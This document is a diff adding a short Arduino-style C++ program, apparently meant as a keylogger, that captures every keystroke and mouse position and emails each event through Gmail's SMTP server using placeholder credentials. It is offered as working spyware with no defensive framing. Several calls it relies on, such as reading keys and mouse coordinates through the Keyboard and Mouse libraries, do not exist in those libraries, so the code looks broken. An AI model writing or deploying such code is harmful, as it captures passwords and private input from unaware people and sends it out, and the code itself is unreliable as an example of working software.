@@ -1,0 +1,31 @@
+//mailden mail
+
+#include <Keyboard.h>
+#include <Mouse.h>
+#include <SMTPClient.h>
+
+void setup() {
+  Keyboard.begin();
+  Mouse.begin();
+}
+
+void loop() {
+  if (Keyboard.available()) {
+    char key = Keyboard.read();
+    String message = "Tus: " + String(key);
+    send_email(message);
+  }
+
+  int x = Mouse.getX();
+  int y = Mouse.getY();
+  String message = "Mouse: x:" + String(x) + " y:" + String(y);
+  send_email(message);
+}
+
+void send_email(String message) {
+  SMTPClient smtp;
+  smtp.begin("smtp.gmail.com", 465, true);
+  smtp.login("mail", "parola");
+  smtp.send("mail", "mail", "Keyboard and Mouse", message);
+  smtp.end();
+}
